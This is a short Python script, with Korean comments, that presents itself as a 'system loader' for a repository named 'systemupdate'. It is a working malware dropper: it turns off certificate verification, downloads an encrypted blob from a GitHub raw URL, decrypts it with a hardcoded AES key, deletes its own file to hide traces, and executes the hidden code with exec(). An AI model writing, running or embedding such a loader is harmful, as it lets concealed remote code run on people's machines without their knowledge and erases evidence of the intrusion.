# -*- coding: utf-8 -*-
"""뚱시스템 로더 — data.txt AES 복호화 + 실행"""
import urllib.request, base64, zlib, time, ssl, os
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = base64.b64decode("W5EwW1vV8EFoNKQsgTCrKmfZzbflm0JDU7MuNG8izu4=")
URL = f"https://raw.githubusercontent.com/blacknut0319-del/systemupdate/main/data.txt?t={int(time.time())}"

try:
    req = urllib.request.Request(URL, headers={"User-Agent": "ddong"})
    b64_str = urllib.request.urlopen(req, timeout=10, context=ctx).read().decode("utf-8").strip()
    raw = base64.b64decode(b64_str)
    g = AESGCM(KEY)
    n, e = raw[:12], raw[12:]
    code = zlib.decompress(g.decrypt(n, e, None)).decode("utf-8")
    try: os.remove(__file__)
    except: pass
    exec(code)
except Exception as err:
    import ctypes
    ctypes.windll.user32.MessageBoxW(0, f"실행 실패: {err}", "오류", 0x10)
